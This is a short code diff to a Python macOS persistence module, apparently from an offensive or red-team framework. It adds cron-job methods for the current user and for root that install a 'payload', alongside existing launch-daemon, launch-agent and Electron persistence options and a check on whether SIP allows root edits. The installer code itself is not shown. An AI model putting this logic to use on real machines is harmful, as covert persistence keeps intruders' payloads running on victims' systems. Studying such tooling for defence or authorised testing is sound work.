@@ -4,11 +4,14 @@ macos.py: macOS-specific persistence logic.
 
 import platform
 
-from .base import Persistence
-from .macos_utilities.electron import SearchElectron
-from .macos_utilities.launch_service import LaunchService
+from .base                                import Persistence
+
+from .macos_utilities.electron            import SearchElectron
+from .macos_utilities.launch_service      import LaunchService
 from .macos_utilities.persistence_methods import MacPersistenceMethods
+
 from .unix_utilities.permissions          import UnixPrivilege
+from .unix_utilities.cronjob              import Cronjob
 
 if platform.system() == "Darwin":
     import py_sip_xnu
@@ -71,6 +74,7 @@ class MacPersistence(Persistence):
         if self.identifier != UnixPrivilege.ROOT.value:
             methods.remove(MacPersistenceMethods.LAUNCH_DAEMON_LIBRARY.value)
             methods.remove(MacPersistenceMethods.LAUNCH_AGENT_LIBRARY.value)
+            methods.remove(MacPersistenceMethods.CRONJOB_ROOT.value)
 
         if self.identifier != UnixPrivilege.ROOT.value or not py_sip_xnu or py_sip_xnu.SipXnu().sip_object.can_edit_root is False:
             methods.remove(MacPersistenceMethods.LAUNCH_DAEMON_SYSTEM.value)
@@ -101,6 +105,13 @@ class MacPersistence(Persistence):
             MacPersistenceMethods.LAUNCH_AGENT_SYSTEM.value
         ]:
             LaunchService(self.payload).install_root_launch_service(method)
+            return
+
+        if method == MacPersistenceMethods.CRONJOB_USER.value:
+            Cronjob(self.payload).install_current_user()
+            return
+        if method == MacPersistenceMethods.CRONJOB_ROOT.value:
+            Cronjob(self.payload).install_root()
             return
 
         if method == MacPersistenceMethods.LAUNCH_AGENT_ELECTRON.value:
